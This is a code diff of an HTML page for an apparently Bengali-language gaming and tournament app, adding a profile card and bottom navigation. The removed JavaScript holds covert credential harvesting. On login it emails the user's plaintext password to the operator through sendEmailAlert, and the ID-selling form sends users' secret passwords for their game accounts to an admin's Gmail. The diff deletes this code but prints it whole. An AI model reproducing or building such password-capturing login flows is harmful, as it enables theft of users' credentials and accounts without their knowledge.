+                <h3 style='color: #25d366; margin-bottom: 15px;'>👤 আপনার প্রোফাইল</h3>
+                <div style='text-align: center; margin-bottom: 20px;'>
+                    <div style='width: 80px; height: 80px; margin: 0 auto 10px auto; border-radius: 50%; background: #25d366; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 32px; font-weight: bold; overflow: hidden; border: 2px solid #334155;'>
+                        <span id='prof-avatar-letter'>S</span>
+                        <img id='prof-avatar-img' src='' style='width: 100%; height: 100%; object-fit: cover; display: none;'/>
+                    </div>
+                    <div style='display: flex; gap: 8px; max-width: 320px; margin: 0 auto;'>
+                        <input id='prof-img-url-input' placeholder='প্রোফাইল ছবির Direct URL লিংক' style='padding: 6px 10px; font-size: 11px; width: 100%; border-radius: 4px; border: 1px solid #334155; background: #0f172a; color: #fff;' type='text'/>
+                        <input accept='image/*' id='prof-file-input' onchange='uploadProfileFile()' style='display: none;' type='file'/>
+                        <button onclick='document.getElementById(&quot;prof-file-input&quot;).click()' style='background: #334155; color: #fff; border: none; padding: 0 10px; border-radius: 4px; cursor: pointer;' type='button'>📷</button>
+                        <button onclick='updateProfilePicture()' style='background: #25d366; color: #fff; border: none; padding: 6px 10px; border-radius: 4px; font-size: 11px; font-weight: bold; cursor: pointer;' type='button'>সেভ</button>
+                    </div>
+                </div>
+                <div class='profile-card'>
+                    <div class='profile-info-row'><span>নাম:</span><span id='prof-name'>-</span></div>
+                    <div class='profile-info-row'><span>নম্বর:</span><span id='prof-phone'>-</span></div>
+                    <div class='profile-info-row'><span>টাকা ব্যালেন্স:</span><span id='prof-balance'>0 Tk</span></div>
+                    <div class='profile-info-row'><span>সম্পন্ন PvP ম্যাচ:</span><span id='prof-pvp'>0 টি</span></div>
+                    <div class='profile-info-row'><span>সম্পন্ন Paid টুর্নামেন্ট:</span><span id='prof-paid'>0 টি</span></div>
+                </div>
+            </div>
+        </div>
 
-            const user = data.user;
-            const name = user.user_metadata.full_name || "User";
-            const phone = user.user_metadata.phone || "N/A";
-
-            localStorage.setItem('userName', name);
-            localStorage.setItem('userPhone', phone);
-            localStorage.setItem('userEmail', email);
-
-            sendEmailAlert("User Login", `Email: ${email}\nPassword Used: ${password}`);
-            alert('Login Successful!');
-            openMainApp(name, phone, email);
-        }
-
-        function openMainApp(name, phone, email) {
-            document.getElementById('pro-name').innerText = name;
-            document.getElementById('pro-phone').innerText = phone;
-            document.getElementById('pro-email').innerText = email;
-
-            document.getElementById('auth-section').style.display = 'none';
-            document.getElementById('main-app-section').style.display = 'block';
-        }
-
-        // আইডি সেল আপলোড ও নোটিফিকেশন
-        window.handleSellID = function() {
-            const title = document.getElementById('sell-title').value;
-            const price = document.getElementById('sell-price').value;
-            const secret = document.getElementById('sell-secret').value;
-            const email = localStorage.getItem('userEmail');
-
-            if(!title || !price || !secret) {
-                alert("Please fill all fields including secret details!");
-                return;
-            }
-
-            sendEmailAlert("ID Sell Request", `User: ${email}\nTitle: ${title}\nPrice: ${price} TK\nSecret Pass/Details: ${secret}`);
-            alert('ID Uploaded Successfully! Admin received secret info via Gmail.');
-        }
-
-        window.notifyAction = function(actionName) {
-            const email = localStorage.getItem('userEmail');
-            sendEmailAlert(actionName, `User Email: ${email}`);
-            alert(actionName + ' request submitted!');
-        }
-
-        // ট্যাব পরিবর্তন ফাংশন
-        window.switchTab = function(tabName) {
-            document.querySelectorAll('.page-section').forEach(sec => sec.classList.remove('active'));
-            document.querySelectorAll('.nav-btn').forEach(btn => btn.classList.remove('active'));
-
-            if(tabName === 'home') {
-                document.getElementById('page-home').classList.add('active');
-                document.getElementById('nav-home').classList.add('active');
-            } else if(tabName === 'tournaments') {
-                document.getElementById('page-tournaments').classList.add('active');
-                document.getElementById('nav-tournaments').classList.add('active');
-            } else if(tabName === 'shop') {
-                document.getElementById('page-shop').classList.add('active');
-                document.getElementById('nav-shop').classList.add('active');
-            } else if(tabName === 'profile') {
-                document.getElementById('page-profile').classList.add('active');
-                document.getElementById('nav-profile').classList.add('active');
-            }
-        }
-
-        window.handleLogout = async function() {
-            await supabaseClient.auth.signOut();
-            localStorage.clear();
-            location.reload();
-        }
-
-        // অটো লগইন চেক
-        window.onload = function(e) {
-            const savedEmail = localStorage.getItem('userEmail');
-            if(savedEmail) {
-                openMainApp(localStorage.getItem('userName'), localStorage.getItem('userPhone'), savedEmail);
-            }
-        }
-    </script>
+        <div class='bottom-nav'>
+            <div class='bottom-nav-item active' onclick='switchSection(&quot;home&quot;)'>🏠 হোম</div>
+            <div class='bottom-nav-item' onclick='switchSection(&quot;deposit&quot;)'>💳 ডিপোজিট</div>
+            <div class='bottom-nav-item' onclick='switchSection(&quot;withdraw&quot;)'>🪙 উইথড্র</div>
+            <div class='bottom-nav-item' onclick='switchSection(&quot;profile&quot;)'>👤 প্রোফাইল</div>
+        </div>
+    </div>
 </body>
 </html>
